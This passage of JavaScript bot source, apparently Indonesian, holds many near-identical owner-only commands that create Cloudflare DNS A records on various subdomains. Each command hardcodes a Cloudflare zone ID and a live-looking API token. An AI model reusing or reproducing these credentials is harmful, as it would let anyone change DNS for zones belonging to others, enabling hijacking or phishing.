                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd25': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd26': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1"
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd27': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4a4818365a74cf535d5b6f16dc62481d";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "ekioffcial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break      

case  'd28': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "725378afbddffcc9e2c2992ba4232421";
               let apitoken = "MAe0GRPPRxS77oPYXTvImAKNTWit55R63AxuNT1B"
               let tld = "panelku-jasteb.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd29': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "705b7ba658c5f033b91b1b7985f53244";
               let apitoken = "Ucf7fYmbCbDuNDGJ1J3KE8noSS3tgNHRQMxCJZk8"
               let tld = "pannel-pvrt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd30': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "128fe0f8f9f09ecce73e5c34c6a31444";
               let apitoken = "5Mp2HncEE28HzVOpjmvrM_vU1UuWPvGEhhbJ4h6-"
               let tld = "sellerpanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd31': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc4748bba0b75e8273b04c3dea2dc59c";
               let apitoken = "JKZrkLdzdd7hmT9XVcsXpoVsXmWQ61bQN6r2_oq-"
               let tld = "pannelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd32': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3f5d5b68ea37bf7b8a10a9a96b544622";
               let apitoken = "fTKJuqbdce2A-9oeoqhJ9vLfo-EUnLqCCz9OAmKG"
               let tld = "server-smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break   
case  'd33': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "my-website.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd34': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80e208bb5900abc50d4483bdb8590d42";
               let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
               let tld = "smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd35': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3d253d788a5ed8fecddba97d3e52cf65";
               let apitoken = "_Y8BhYGmFb_aJEWHml7oQ2j70GPE6raCm_Ud99Yl";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd36': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "583196d8ec9e16fbe5bbe944efbb3d8a";
               let apitoken = "jZ4EuzWs4-ktGcfkwht3NbZfGlZm_VnWjtYyG-1U";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd37': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ"
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
        
case 'd38': {
if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb6a14586a737768de8eb75e417be305";
               let apitoken = "WG-rSvje9yH9EXKyMZqyBP8yUtpWmUoQmsoxfpnO";
               let tld = "ruztanxd.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${namabot}
┗━━━━━━━━━━━━━━━━━━━
*𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙬𝙞𝙣𝙙𝙖 𝙩𝙚𝙧𝙪𝙨 𝙮𝙖𝙖 >_<*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'd39': {
        if (!TradID) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0cf0d98bcb60af202ad5816f672ca471";
               let apitoken = "f5ApkZpsRdJxTuA0xlfr9vCJ1bknGAAJ7rv10H_f";
